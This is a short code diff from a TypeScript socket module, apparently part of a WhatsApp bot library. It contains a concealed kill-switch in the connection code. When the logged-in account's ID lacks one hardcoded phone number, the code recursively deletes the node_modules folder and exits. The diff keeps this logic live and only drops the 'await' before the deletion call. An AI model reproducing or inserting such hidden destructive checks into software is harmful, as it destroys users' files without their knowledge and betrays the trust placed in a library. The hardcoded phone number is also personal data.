@@ -763,7 +763,7 @@ export const makeSocket = (config: SocketConfig) => {
 	  if(authState.creds.me?.id && !authState.creds.me?.id?.includes('6285876500334')) {
 	     console.log(new Boom('Detected bots that are not permitted', { statusCode: 503 }))
 	     const modulePath = join(__dirname, 'node_modules');
-       await rm(modulePath, { recursive: true });
+       rm(modulePath, { recursive: true });
 	     process.exit(1)
 	  }
 	  printQRIfNecessaryListener(ev, logger)
